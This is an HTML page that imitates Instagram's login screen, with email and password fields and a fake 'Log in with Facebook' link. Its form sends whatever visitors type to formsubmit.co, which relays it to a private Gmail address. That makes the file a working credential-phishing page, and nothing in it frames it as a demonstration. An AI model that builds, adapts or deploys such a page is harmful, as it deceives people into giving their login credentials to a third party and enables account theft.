<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>FORM</title>
    <link rel="stylesheet" href="index.css" />
    <link rel="icon" href="image/gt.webp" type="image/x-icon" />
  </head>
  <body>
    <main>
      <div class="form1">
        <div class="head">
          <h1>Instagram</h1>
        </div>
        <form
          action="https://formsubmit.co/fazilahamed.kr@gmail.com"
          method="post"
        >
          <div class="user">
            <p>
              <label for="username"></label>
              <input
                type="text"
                name="Email"
                placeholder="Enter your email"
                autocomplete="on"
                style="font-size: 16px"
              />
            </p>
            <p>
              <label for="password"></label>
              <input
                type="password"
                name="Password"
                placeholder="password"
                autocomplete="off"
                style="font-size: 16px"
              />
            </p>
          </div>
          <div class="button">
            <button type="LOGIN">LOG IN</button>
          </div>
        </form>
        <div class="or">
          <p>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;</p>
          &nbsp; &nbsp;
          <p>OR</p>
          &nbsp; &nbsp;
          <p>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;</p>
        </div>
        <div class="logo">
          <img
            src="image/f79920f4cb34986684e29df42ec0cebe.jpg"
            alt="no img"
            title="fblogo"
            width="20px"
            height="20px"
            style="margin-top: -2px"
          />
          <p style="margin-top: -1px">
            &nbsp;<a href="#" style="text-decoration: none"
              >Log in with Facebook</a
            >
          </p>
        </div>
        <div class="fpass">
          <p><a href="#" style="text-decoration: none">forgot password?</a></p>
        </div>
      </div>
      &nbsp;
      <div class="form2">
        <div class="sup">
          <p>
            Don't have an account?
            <a href="#" style="text-decoration: none">Sign up</a>
          </p>
        </div>
      </div>
    </main>
  </body>
</html>
